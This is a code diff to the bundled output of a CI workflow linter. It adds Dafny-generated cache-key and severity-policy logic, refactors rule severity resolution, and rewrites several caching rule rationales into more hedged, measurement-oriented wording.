+      if (new BigNumber(t.length).isEqualTo(_dafny.ZERO)) {
+        return _dafny.Seq.of();
+      } else {
+        let _0_rest = CacheKey.__default.Norm(t.slice(_dafny.ONE));
+        if (t[_dafny.ZERO].is_Lit) {
+          if (new BigNumber(t[_dafny.ZERO].dtor_s.length).isEqualTo(_dafny.ZERO)) {
+            return _0_rest;
+          } else if (_dafny.ZERO.isLessThan(new BigNumber(_0_rest.length)) && _0_rest[_dafny.ZERO].is_Lit) {
+            return _dafny.Seq.Concat(_dafny.Seq.of(CacheKey.Comp.create_Lit(_dafny.Seq.Concat(t[_dafny.ZERO].dtor_s, _0_rest[_dafny.ZERO].dtor_s))), _0_rest.slice(_dafny.ONE));
+          } else {
+            return _dafny.Seq.Concat(_dafny.Seq.of(t[_dafny.ZERO]), _0_rest);
+          }
+        } else {
+          return _dafny.Seq.Concat(_dafny.Seq.of(t[_dafny.ZERO]), _0_rest);
+        }
+      }
+    }
+    static DSet(deps) {
+      return (function() {
+        let _coll0 = new _dafny.Set();
+        for (const _compr_0 of deps.Elements) {
+          let _0_e = _compr_0;
+          if (_dafny.Seq.contains(deps, _0_e)) {
+            _coll0.add(_0_e);
+          }
+        }
+        return _coll0;
+      })();
+    }
+    static DepOf(c) {
+      let _source0 = c;
+      {
+        if (_source0.is_RunnerOs) {
+          return CacheKey.Dep.create_DOs();
+        }
+      }
+      {
+        if (_source0.is_HashFiles) {
+          let _0_id = _source0.id;
+          return CacheKey.Dep.create_DFiles(_0_id);
+        }
+      }
+      {
+        let _1_x = _source0.c;
+        return CacheKey.Dep.create_DCtx(_1_x);
+      }
+    }
+    static FirstUnsep(t) {
+      if (new BigNumber(t.length).isEqualTo(_dafny.ZERO)) {
+        return _dafny.ZERO;
+      } else if (!CacheKey.__default.SepHead(t)) {
+        return _dafny.ZERO;
+      } else {
+        let _0_k = CacheKey.__default.FirstUnsep(t.slice(_dafny.ONE));
+        return _0_k.plus(_dafny.ONE);
+      }
+    }
+    static Uncovered(t, deps) {
+      if (new BigNumber(deps.length).isEqualTo(_dafny.ZERO)) {
+        return _dafny.Seq.of();
+      } else {
+        let _0_rest = CacheKey.__default.Uncovered(t, deps.slice(_dafny.ONE));
+        if (_dafny.Seq.contains(t, CacheKey.__default.CompOf(deps[_dafny.ZERO]))) {
+          return _0_rest;
+        } else {
+          return _dafny.Seq.Concat(_dafny.Seq.of(deps[_dafny.ZERO]), _0_rest);
+        }
+      }
+    }
+    static Undetermined(t, deps) {
+      if (new BigNumber(t.length).isEqualTo(_dafny.ZERO)) {
+        return _dafny.Seq.of();
+      } else {
+        let _0_rest = CacheKey.__default.Undetermined(t.slice(_dafny.ONE), deps);
+        if (t[_dafny.ZERO].is_Lit || _dafny.Seq.contains(deps, CacheKey.__default.DepOf(t[_dafny.ZERO]))) {
+          return _0_rest;
+        } else {
+          return _dafny.Seq.Concat(_dafny.Seq.of(t[_dafny.ZERO]), _0_rest);
+        }
+      }
+    }
+    static Classify(t, deps) {
+      let _0_n = CacheKey.__default.Norm(t);
+      let _1_k = CacheKey.__default.FirstUnsep(_0_n);
+      if (_1_k.isLessThan(new BigNumber(_0_n.length))) {
+        return CacheKey.Verdict.create_Unsupported(_1_k);
+      } else {
+        return CacheKey.Verdict.create_Checked(CacheKey.__default.Uncovered(_0_n, deps), CacheKey.__default.Undetermined(_0_n, deps));
+      }
+    }
+    static Prune(t, deps) {
+      if (new BigNumber(t.length).isEqualTo(_dafny.ZERO)) {
+        return _dafny.Seq.of();
+      } else {
+        let _0_rest = CacheKey.__default.Prune(t.slice(_dafny.ONE), deps);
+        if (t[_dafny.ZERO].is_Lit || _dafny.Seq.contains(deps, CacheKey.__default.DepOf(t[_dafny.ZERO]))) {
+          return _dafny.Seq.Concat(_dafny.Seq.of(t[_dafny.ZERO]), _0_rest);
+        } else {
+          return _0_rest;
+        }
+      }
+    }
+    static Recommend(t, deps) {
+      return CacheKey.__default.Norm(CacheKey.__default.Prune(t, deps));
+    }
+    static Rep(ch, n) {
+      return _dafny.Seq.Create(n, /* @__PURE__ */ ((_0_ch) => function(_1___v3) {
+        return _0_ch;
+      })(ch));
+    }
+    static BaseCtx() {
+      return _dafny.Map.Empty.slice().updateUnsafe(CacheKey.CtxVar.create_Sha(), CacheKey.__default.Rep(new _dafny.CodePoint("0".codePointAt(0)), new BigNumber(40))).updateUnsafe(CacheKey.CtxVar.create_RunId(), _dafny.Seq.UnicodeFromString("1")).updateUnsafe(CacheKey.CtxVar.create_RunNumber(), _dafny.Seq.UnicodeFromString("1")).updateUnsafe(CacheKey.CtxVar.create_RunAttempt(), _dafny.Seq.UnicodeFromString("1"));
+    }
+    static Base() {
+      return CacheKey.Run.create_Run(_dafny.Seq.UnicodeFromString("Linux"), _dafny.Map.Empty.slice(), CacheKey.__default.BaseCtx());
+    }
+    static AltCtx(x) {
+      if (_dafny.areEqual(x, CacheKey.CtxVar.create_Sha())) {
+        return CacheKey.__default.Rep(new _dafny.CodePoint("1".codePointAt(0)), new BigNumber(40));
+      } else if (_dafny.areEqual(x, CacheKey.CtxVar.create_RunId()) || _dafny.areEqual(x, CacheKey.CtxVar.create_RunNumber()) || _dafny.areEqual(x, CacheKey.CtxVar.create_RunAttempt())) {
+        return _dafny.Seq.UnicodeFromString("2");
+      } else {
+        return _dafny.Seq.UnicodeFromString("x");
+      }
+    }
+    static Vary(d) {
+      let _source0 = d;
+      {
+        if (_source0.is_DOs) {
+          let _0_dt__update__tmp_h0 = CacheKey.__default.Base();
+          let _1_dt__update_hos_h0 = _dafny.Seq.UnicodeFromString("Windows");
+          return CacheKey.Run.create_Run(_1_dt__update_hos_h0, _0_dt__update__tmp_h0.dtor_files, _0_dt__update__tmp_h0.dtor_ctx);
+        }
+      }
+      {
+        if (_source0.is_DFiles) {
+          let _2_id = _source0.id;
+          let _3_dt__update__tmp_h1 = CacheKey.__default.Base();
+          let _4_dt__update_hfiles_h0 = _dafny.Map.Empty.slice().updateUnsafe(_2_id, CacheKey.__default.Rep(new _dafny.CodePoint("a".codePointAt(0)), new BigNumber(64)));
+          return CacheKey.Run.create_Run(_3_dt__update__tmp_h1.dtor_os, _4_dt__update_hfiles_h0, _3_dt__update__tmp_h1.dtor_ctx);
+        }
+      }
+      {
+        let _5_x = _source0.c;
+        let _6_dt__update__tmp_h2 = CacheKey.__default.Base();
+        let _7_dt__update_hctx_h0 = CacheKey.__default.BaseCtx().update(_5_x, CacheKey.__default.AltCtx(_5_x));
+        return CacheKey.Run.create_Run(_6_dt__update__tmp_h2.dtor_os, _6_dt__update__tmp_h2.dtor_files, _7_dt__update_hctx_h0);
+      }
+    }
+  };
+  $module.CtxVar = class CtxVar {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Sha() {
+      let $dt = new CtxVar(0);
+      return $dt;
+    }
+    static create_RunId() {
+      let $dt = new CtxVar(1);
+      return $dt;
+    }
+    static create_RunNumber() {
+      let $dt = new CtxVar(2);
+      return $dt;
+    }
+    static create_RunAttempt() {
+      let $dt = new CtxVar(3);
+      return $dt;
+    }
+    static create_Ref() {
+      let $dt = new CtxVar(4);
+      return $dt;
+    }
+    static create_EventName() {
+      let $dt = new CtxVar(5);
+      return $dt;
+    }
+    get is_Sha() {
+      return this.$tag === 0;
+    }
+    get is_RunId() {
+      return this.$tag === 1;
+    }
+    get is_RunNumber() {
+      return this.$tag === 2;
+    }
+    get is_RunAttempt() {
+      return this.$tag === 3;
+    }
+    get is_Ref() {
+      return this.$tag === 4;
+    }
+    get is_EventName() {
+      return this.$tag === 5;
+    }
+    static get AllSingletonConstructors() {
+      return this.AllSingletonConstructors_();
+    }
+    static *AllSingletonConstructors_() {
+      yield CtxVar.create_Sha();
+      yield CtxVar.create_RunId();
+      yield CtxVar.create_RunNumber();
+      yield CtxVar.create_RunAttempt();
+      yield CtxVar.create_Ref();
+      yield CtxVar.create_EventName();
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CacheKey.CtxVar.Sha";
+      } else if (this.$tag === 1) {
+        return "CacheKey.CtxVar.RunId";
+      } else if (this.$tag === 2) {
+        return "CacheKey.CtxVar.RunNumber";
+      } else if (this.$tag === 3) {
+        return "CacheKey.CtxVar.RunAttempt";
+      } else if (this.$tag === 4) {
+        return "CacheKey.CtxVar.Ref";
+      } else if (this.$tag === 5) {
+        return "CacheKey.CtxVar.EventName";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0;
+      } else if (this.$tag === 1) {
+        return other.$tag === 1;
+      } else if (this.$tag === 2) {
+        return other.$tag === 2;
+      } else if (this.$tag === 3) {
+        return other.$tag === 3;
+      } else if (this.$tag === 4) {
+        return other.$tag === 4;
+      } else if (this.$tag === 5) {
+        return other.$tag === 5;
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CacheKey.CtxVar.create_Sha();
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return CtxVar.Default();
+        }
+      };
+    }
+  };
+  $module.Comp = class Comp {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Lit(s) {
+      let $dt = new Comp(0);
+      $dt.s = s;
+      return $dt;
+    }
+    static create_RunnerOs() {
+      let $dt = new Comp(1);
+      return $dt;
+    }
+    static create_HashFiles(id) {
+      let $dt = new Comp(2);
+      $dt.id = id;
+      return $dt;
+    }
+    static create_Ctx(c) {
+      let $dt = new Comp(3);
+      $dt.c = c;
+      return $dt;
+    }
+    get is_Lit() {
+      return this.$tag === 0;
+    }
+    get is_RunnerOs() {
+      return this.$tag === 1;
+    }
+    get is_HashFiles() {
+      return this.$tag === 2;
+    }
+    get is_Ctx() {
+      return this.$tag === 3;
+    }
+    get dtor_s() {
+      return this.s;
+    }
+    get dtor_id() {
+      return this.id;
+    }
+    get dtor_c() {
+      return this.c;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CacheKey.Comp.Lit(" + this.s.toVerbatimString(true) + ")";
+      } else if (this.$tag === 1) {
+        return "CacheKey.Comp.RunnerOs";
+      } else if (this.$tag === 2) {
+        return "CacheKey.Comp.HashFiles(" + _dafny.toString(this.id) + ")";
+      } else if (this.$tag === 3) {
+        return "CacheKey.Comp.Ctx(" + _dafny.toString(this.c) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.s, other.s);
+      } else if (this.$tag === 1) {
+        return other.$tag === 1;
+      } else if (this.$tag === 2) {
+        return other.$tag === 2 && _dafny.areEqual(this.id, other.id);
+      } else if (this.$tag === 3) {
+        return other.$tag === 3 && _dafny.areEqual(this.c, other.c);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CacheKey.Comp.create_Lit(_dafny.Seq.UnicodeFromString(""));
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Comp.Default();
+        }
+      };
+    }
+  };
+  $module.Dep = class Dep {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_DOs() {
+      let $dt = new Dep(0);
+      return $dt;
+    }
+    static create_DFiles(id) {
+      let $dt = new Dep(1);
+      $dt.id = id;
+      return $dt;
+    }
+    static create_DCtx(c) {
+      let $dt = new Dep(2);
+      $dt.c = c;
+      return $dt;
+    }
+    get is_DOs() {
+      return this.$tag === 0;
+    }
+    get is_DFiles() {
+      return this.$tag === 1;
+    }
+    get is_DCtx() {
+      return this.$tag === 2;
+    }
+    get dtor_id() {
+      return this.id;
+    }
+    get dtor_c() {
+      return this.c;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CacheKey.Dep.DOs";
+      } else if (this.$tag === 1) {
+        return "CacheKey.Dep.DFiles(" + _dafny.toString(this.id) + ")";
+      } else if (this.$tag === 2) {
+        return "CacheKey.Dep.DCtx(" + _dafny.toString(this.c) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0;
+      } else if (this.$tag === 1) {
+        return other.$tag === 1 && _dafny.areEqual(this.id, other.id);
+      } else if (this.$tag === 2) {
+        return other.$tag === 2 && _dafny.areEqual(this.c, other.c);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CacheKey.Dep.create_DOs();
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Dep.Default();
+        }
+      };
+    }
+  };
+  $module.Run = class Run {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Run(os, files, ctx) {
+      let $dt = new Run(0);
+      $dt.os = os;
+      $dt.files = files;
+      $dt.ctx = ctx;
+      return $dt;
+    }
+    get is_Run() {
+      return this.$tag === 0;
+    }
+    get dtor_os() {
+      return this.os;
+    }
+    get dtor_files() {
+      return this.files;
+    }
+    get dtor_ctx() {
+      return this.ctx;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CacheKey.Run.Run(" + this.os.toVerbatimString(true) + ", " + _dafny.toString(this.files) + ", " + _dafny.toString(this.ctx) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.os, other.os) && _dafny.areEqual(this.files, other.files) && _dafny.areEqual(this.ctx, other.ctx);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CacheKey.Run.create_Run(_dafny.Seq.UnicodeFromString(""), _dafny.Map.Empty, _dafny.Map.Empty);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Run.Default();
+        }
+      };
+    }
+  };
+  $module.Cls = class Cls {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Letters() {
+      let $dt = new Cls(0);
+      return $dt;
+    }
+    static create_Hex() {
+      let $dt = new Cls(1);
+      return $dt;
+    }
+    static create_Digits() {
+      let $dt = new Cls(2);
+      return $dt;
+    }
+    static create_Any() {
+      let $dt = new Cls(3);
+      return $dt;
+    }
+    get is_Letters() {
+      return this.$tag === 0;
+    }
+    get is_Hex() {
+      return this.$tag === 1;
+    }
+    get is_Digits() {
+      return this.$tag === 2;
+    }
+    get is_Any() {
+      return this.$tag === 3;
+    }
+    static get AllSingletonConstructors() {
+      return this.AllSingletonConstructors_();
+    }
+    static *AllSingletonConstructors_() {
+      yield Cls.create_Letters();
+      yield Cls.create_Hex();
+      yield Cls.create_Digits();
+      yield Cls.create_Any();
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CacheKey.Cls.Letters";
+      } else if (this.$tag === 1) {
+        return "CacheKey.Cls.Hex";
+      } else if (this.$tag === 2) {
+        return "CacheKey.Cls.Digits";
+      } else if (this.$tag === 3) {
+        return "CacheKey.Cls.Any";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0;
+      } else if (this.$tag === 1) {
+        return other.$tag === 1;
+      } else if (this.$tag === 2) {
+        return other.$tag === 2;
+      } else if (this.$tag === 3) {
+        return other.$tag === 3;
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CacheKey.Cls.create_Letters();
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Cls.Default();
+        }
+      };
+    }
+  };
+  $module.Verdict = class Verdict {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Unsupported(at) {
+      let $dt = new Verdict(0);
+      $dt.at = at;
+      return $dt;
+    }
+    static create_Checked(uncovered, undetermined) {
+      let $dt = new Verdict(1);
+      $dt.uncovered = uncovered;
+      $dt.undetermined = undetermined;
+      return $dt;
+    }
+    get is_Unsupported() {
+      return this.$tag === 0;
+    }
+    get is_Checked() {
+      return this.$tag === 1;
+    }
+    get dtor_at() {
+      return this.at;
+    }
+    get dtor_uncovered() {
+      return this.uncovered;
+    }
+    get dtor_undetermined() {
+      return this.undetermined;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CacheKey.Verdict.Unsupported(" + _dafny.toString(this.at) + ")";
+      } else if (this.$tag === 1) {
+        return "CacheKey.Verdict.Checked(" + _dafny.toString(this.uncovered) + ", " + _dafny.toString(this.undetermined) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.at, other.at);
+      } else if (this.$tag === 1) {
+        return other.$tag === 1 && _dafny.areEqual(this.uncovered, other.uncovered) && _dafny.areEqual(this.undetermined, other.undetermined);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CacheKey.Verdict.create_Unsupported(_dafny.ZERO);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Verdict.Default();
+        }
+      };
+    }
+  };
+  return $module;
+})();
+
+// src/formal/policy.ts
+var LEVELS = ["off", "info", "warn", "error"];
+function resolveSeverity(updates) {
+  const encoded = updates.map((level2) => {
+    const index = level2 === void 0 ? -1 : LEVELS.indexOf(level2);
+    if (level2 !== void 0 && index < 0) throw new Error(`Unknown severity: ${String(level2)}`);
+    return new BigNumber(index);
+  });
+  const result = Policy.__default.Resolve(_dafny.Seq.of(...encoded)).toNumber();
+  const severity3 = LEVELS[result];
+  if (severity3 === void 0) throw new Error("Unexpected generated policy result.");
+  return severity3;
+}
+
 // src/knowledge/duration-policy.ts
 function durationPolicyProblems(config2) {
   const problems = [];
@@ -45950,36 +50277,19 @@ function parseConfigText(text4, rules15, path = CONFIG_PATHS[0] ?? "config") {
 }
 function resolveRules(config2, rules15, presetOverride) {
   const presets = presetOverride ?? config2.extends;
-  const severity3 = new Map(rules15.map((rule) => [rule.meta.id, "off"]));
-  for (const preset of presets) {
-    for (const rule of rules15) {
-      if (preset === "all" || rule.meta.presets.includes(preset)) {
-        severity3.set(rule.meta.id, rule.meta.defaultSeverity);
-      }
-    }
-  }
-  for (const [ruleset, value] of Object.entries(config2.rulesets)) {
-    for (const rule of rules15) {
-      if (rule.meta.ruleset === ruleset) severity3.set(rule.meta.id, value);
-    }
-  }
-  const options = /* @__PURE__ */ new Map();
-  for (const [id, setting] of Object.entries(config2.rules)) {
-    if (Array.isArray(setting)) {
-      severity3.set(id, setting[0]);
-      options.set(id, setting[1]);
-    } else {
-      severity3.set(id, setting);
-    }
-  }
   return rules15.flatMap((rule) => {
-    const level2 = severity3.get(rule.meta.id) ?? "off";
+    const setting = config2.rules[rule.meta.id];
+    const level2 = resolveSeverity([
+      ...presets.map((preset) => preset === "all" || rule.meta.presets.includes(preset) ? rule.meta.defaultSeverity : void 0),
+      config2.rulesets[rule.meta.ruleset],
+      Array.isArray(setting) ? setting[0] : setting
+    ]);
     if (level2 === "off") return [];
     return [
       {
         rule,
         severity: level2,
-        options: { ...rule.meta.defaultOptions, ...options.get(rule.meta.id) ?? {} }
+        options: { ...rule.meta.defaultOptions, ...Array.isArray(setting) ? setting[1] : {} }
       }
     ];
   });
@@ -46144,13 +50454,13 @@ var isLockfile = (path) => LOCKFILES.has(path.slice(path.lastIndexOf("/") + 1));
 // src/lint/inventory.ts
 var run = promisify(execFile);
 var LOCKFILE_HEAD_BYTES = 8192;
-function selectInventory(entries2, config2) {
+function selectInventory(entries3, config2) {
   const paths2 = [];
   const truncated = [];
   let complete = true;
   let excluded = false;
   const ignored2 = (path) => config2.ignorePaths.some((glob) => matchesGlob(path, glob) || matchesGlob(path, `${glob}/**`));
-  for (const entry2 of [...entries2].sort((a, b) => a.path.localeCompare(b.path))) {
+  for (const entry2 of [...entries3].sort((a, b) => a.path.localeCompare(b.path))) {
     if (ignored2(entry2.path)) {
       if (isInventoryPath(entry2.path) || entry2.opaque && !entry2.path.split("/").some((part) => SKIP_DIRS.has(part))) excluded = true;
       continue;
@@ -46192,9 +50502,9 @@ async function walk(root2, dir, out) {
   }
 }
 async function loadDirectory(root2, config2, change) {
-  const entries2 = [];
-  await walk(root2, root2, entries2);
-  const selection = selectInventory(entries2, config2);
+  const entries3 = [];
+  await walk(root2, root2, entries3);
+  const selection = selectInventory(entries3, config2);
   const truncated = new Set(selection.truncated);
   const files = await Promise.all(
     selection.paths.map(async (path) => {
@@ -46210,8 +50520,8 @@ async function git(root2, args) {
 }
 async function loadGitRevision(root2, ref, config2) {
   const listing = await git(root2, ["ls-tree", "-r", "-l", "-z", "--full-tree", ref]);
-  const entries2 = listing.split("\0").map((line2) => /^(\d+) (?:blob|commit) [0-9a-f]+\s+(\d+|-)\t([\s\S]+)$/.exec(line2)).filter((match) => match !== null).map((match) => ({ path: match[3], size: Number(match[2]) || 0, opaque: match[1] === "120000" || match[1] === "160000" }));
-  const selection = selectInventory(entries2, config2);
+  const entries3 = listing.split("\0").map((line2) => /^(\d+) (?:blob|commit) [0-9a-f]+\s+(\d+|-)\t([\s\S]+)$/.exec(line2)).filter((match) => match !== null).map((match) => ({ path: match[3], size: Number(match[2]) || 0, opaque: match[1] === "120000" || match[1] === "160000" }));
+  const selection = selectInventory(entries3, config2);
   const truncated = new Set(selection.truncated);
   const files = [];
   for (const path of selection.paths) {
@@ -47488,7 +51798,7 @@ var build_tool_cache_default = defineRule({
     id: "caching/build-tool-cache",
     ruleset: "caching",
     description: "Build tools with their own caches (Gradle, Maven, Cargo, Bazel, Turborepo, Nx) should persist them between runs.",
-    rationale: "Gradle, Maven, Cargo, Bazel, Turborepo and Nx skip downloads and unchanged work when their caches are warm, but hosted runners start empty. Without a cache action or a remote cache, every run (and every agent iteration) rebuilds from scratch.",
+    rationale: "Gradle, Maven, Cargo, Bazel, Turborepo and Nx can reuse downloads or build outputs when compatible caches are warm. Fresh runners often lack that state, but remote caches, preinstalled dependencies and tool-specific invalidation can change the benefit. A missing visible cache is a candidate for measurement, not proof that all work is repeated or that adding a cache will be faster.",
     kind: "practice",
     defaultSeverity: "info",
     presets: ["recommended", "agentic"],
@@ -47549,7 +51859,7 @@ var cache_key_default = defineRule({
     id: "caching/cache-key",
     ruleset: "caching",
     description: "actions/cache keys must invalidate when inputs change and still hit between runs.",
-    rationale: "A static key never changes, so the cache goes stale forever (caches are immutable once saved). A key containing the commit SHA or run id without `restore-keys` misses on every run, paying the upload cost with no benefit. Caching node_modules for `npm ci` is wasted work because `npm ci` deletes node_modules before installing.",
+    rationale: "A static primary key does not encode dependency changes. SHA/run-scoped keys can prevent reuse across different context values, although reruns can reuse a key and Actions cache scope/version, prefix lookup and eviction also affect hits. Whether removing a context is safe depends on the workload's actual dependencies. `formal cache-key` checks only an explicit primary-key string-partition model relative to declared dependencies; it does not prove hits or speedups. Restoring node_modules before an unconditional `npm ci` is usually wasteful because npm ci removes that directory.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic", "strict"],
@@ -47580,7 +51890,7 @@ var cache_key_default = defineRule({
               path: workflow.path,
               line: key.line,
               key: `${step.key}:static-key`,
-              message: `Cache key \`${text4}\` is static, so the cache is never invalidated when dependencies change.`,
+              message: `Cache key \`${text4}\` is static and does not encode dependency changes.`,
               suggestion: "Include a hash of the inputs, e.g. `key: deps-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}`, plus `restore-keys` for partial hits.",
               confidence: /\d/.test(text4) ? "medium" : "high"
             });
@@ -47590,7 +51900,7 @@ var cache_key_default = defineRule({
               path: workflow.path,
               line: key.line,
               key: `${step.key}:volatile-key`,
-              message: `Cache key includes \`${match}\` but has no \`restore-keys\`, so every run misses the cache.`,
+              message: `Cache key includes \`${match}\` but has no explicit \`restore-keys\`; different context values can limit cache reuse.`,
               suggestion: "Add `restore-keys` with the key's stable prefix, or key on a hash of the inputs (`hashFiles(...)`) instead."
             });
           }
@@ -47641,7 +51951,7 @@ var docker_layer_cache_default = defineRule({
     id: "caching/docker-layer-cache",
     ruleset: "caching",
     description: "Docker image builds in CI should import and export a layer cache.",
-    rationale: "Hosted runners start with an empty BuildKit cache, so without `cache-from`/`cache-to` every layer (including dependency installs) is rebuilt on every run. The GitHub Actions cache backend defaults every build to the same `buildkit` scope, so multiple images overwrite each other's cache unless each gets a unique `scope`. Inline cache only supports `mode=min` (final-stage layers); a registry cache with `mode=max` also caches intermediate stages.",
+    rationale: "Fresh BuildKit builders may repeat expensive layers without reusable cache state; remote or persistent builders can differ. The GitHub Actions backend's default `buildkit` scope can cause builds to overwrite one another's exported cache. Separate scopes and appropriate import/export settings may improve reuse, but transfer overhead and invalidation still require measurement. Inline cache supports mode=min; a registry cache with mode=max can include intermediate stages.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic"],
@@ -47676,8 +51986,8 @@ var docker_layer_cache_default = defineRule({
           });
           continue;
         }
-        const entries2 = [...cacheEntries(cacheTo2), ...cacheEntries(cacheFrom)];
-        const unscoped = entries2.find((entry2) => entry2.type === "gha" && !entry2.attributes.has("scope"));
+        const entries3 = [...cacheEntries(cacheTo2), ...cacheEntries(cacheFrom)];
+        const unscoped = entries3.find((entry2) => entry2.type === "gha" && !entry2.attributes.has("scope"));
         if (unscoped && buildPushCount >= 2) {
           report({
             path: workflow.path,
@@ -47687,7 +51997,7 @@ var docker_layer_cache_default = defineRule({
             suggestion: "Give each image a unique scope, e.g. `cache-from: type=gha,scope=<image>` and `cache-to: type=gha,mode=max,scope=<image>`."
           });
         }
-        const inline = entries2.find((entry2) => entry2.type === "inline");
+        const inline = entries3.find((entry2) => entry2.type === "inline");
         if (inline) {
           report({
             path: workflow.path,
@@ -47938,8 +52248,8 @@ var matrix_cache_key_missing_os_default = defineRule({
           const crossOsInputs = [.../* @__PURE__ */ new Set([keyStep, saveStep])].map((candidate) => candidate.with.get("enableCrossOsArchive"));
           if (crossOsInputs.some((input3) => input3 !== void 0 && input3.kind !== "literal")) continue;
           const crossOs = crossOsInputs.every((input3) => isTrue(input3?.value));
-          const entries2 = listOf(path).filter((entry2) => !entry2.startsWith("!"));
-          if (entries2.length > 0 && entries2.every((entry2) => NEUTRAL_PATHS.has(entry2.replace(/\/+$/, "")))) continue;
+          const entries3 = listOf(path).filter((entry2) => !entry2.startsWith("!"));
+          if (entries3.length > 0 && entries3.every((entry2) => NEUTRAL_PATHS.has(entry2.replace(/\/+$/, "")))) continue;
           const keyEnv = envResolver(workflow, job, keyStep);
           const pathEnv = envResolver(workflow, job, saveStep);
           const signatures = legs.map((leg) => {
@@ -48320,7 +52630,7 @@ var setup_cache_default = defineRule({
     id: "caching/setup-cache",
     ruleset: "caching",
     description: "Language setup actions should cache downloaded dependencies.",
-    rationale: "Without caching, every run re-downloads all dependencies from the registry, which is often the slowest part of a job and is repeated on every agent iteration. setup-node, setup-python, setup-java and setup-dotnet only cache when `cache` is set (setup-node v6+ auto-caches npm only when package.json `packageManager` names npm); setup-go caches by default.",
+    rationale: "Dependency downloads can be a large repeated cost on fresh runners. An effective cache may reduce that cost, but prewarmed runners, external caches and restore/upload overhead can change the benefit; measure the affected job. setup-node, setup-python, setup-java and setup-dotnet support explicit `cache` settings (setup-node v6+ also auto-caches npm when package metadata selects npm); setup-go caches by default.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic"],
@@ -48403,9 +52713,9 @@ var uncompressed_artifact_upload_default = defineRule({
       if (major === void 0 || major < 4 || major > 7) continue;
       const path = step.with.get("path");
       if (!path || path.kind === "expression" || typeof path.value !== "string") continue;
-      const entries2 = listOf(path.value).filter((entry2) => !entry2.startsWith("!"));
-      if (entries2.length === 0 || !entries2.every((entry2) => COMPRESSED.test(entry2))) continue;
-      const shown = entries2.map((entry2) => `\`${entry2}\``).join(", ");
+      const entries3 = listOf(path.value).filter((entry2) => !entry2.startsWith("!"));
+      if (entries3.length === 0 || !entries3.every((entry2) => COMPRESSED.test(entry2))) continue;
+      const shown = entries3.map((entry2) => `\`${entry2}\``).join(", ");
       report({
         path: workflow.path,
         line: stepLine(step),
@@ -50691,8 +55001,8 @@ var gha_cache_mode_min_default = defineRule({
     for (const workflow of [...project.workflows, ...project.actions]) {
       for (const job of workflow.jobs) {
         for (const site of jobBuilds(workflow, job)) {
-          const entries2 = siteCacheEntries(site, "cache-to");
-          const minimal = entries2.filter((entry2) => {
+          const entries3 = siteCacheEntries(site, "cache-to");
+          const minimal = entries3.filter((entry2) => {
             if (!MODE_EXPORTERS.has(entry2.type)) return false;
             const mode = entry2.attributes.get("mode")?.toLowerCase();
             return mode === void 0 || mode === "min";
@@ -51397,8 +55707,8 @@ var shared_base_default = defineRule({
   meta: {
     id: "containers/shared-base",
     ruleset: "containers",
-    description: "Dockerfiles that repeat the same base image and toolchain preamble should share a base image published to GHCR.",
-    rationale: "When several services start from the same image and install the same toolchain, every service build and every runner repeats that work and stores its own copy of the layer. Publishing the preamble once as a shared base image (referenced by digest) builds it once, lets every service and agent sandbox pull the identical cached layer, and turns toolchain upgrades into a single reviewed digest bump.",
+    description: "Review repeated base-image and toolchain preambles for possible shared-base reuse.",
+    rationale: "A published shared base can move repeated toolchain installation into a separate build, but existing layer caches may already reuse that work. Compare build savings with publication and image-pull costs, preserve platform and per-service requirements, and maintain reviewed digest updates. Matching preamble text alone does not prove equivalent execution or a speedup.",
     kind: "insight",
     defaultSeverity: "info",
     presets: ["insights"],
@@ -51431,17 +55741,17 @@ ${entry2.steps.join("\n")}`;
         groups.set(signature, [...groups.get(signature) ?? [], entry2]);
       }
     }
-    for (const [signature, entries2] of groups) {
-      if (entries2.length < options.minDockerfiles) continue;
-      const [first, ...others] = entries2;
+    for (const [signature, entries3] of groups) {
+      if (entries3.length < options.minDockerfiles) continue;
+      const [first, ...others] = entries3;
       if (!first) continue;
       report({
         path: first.model.path,
         line: first.stage.line,
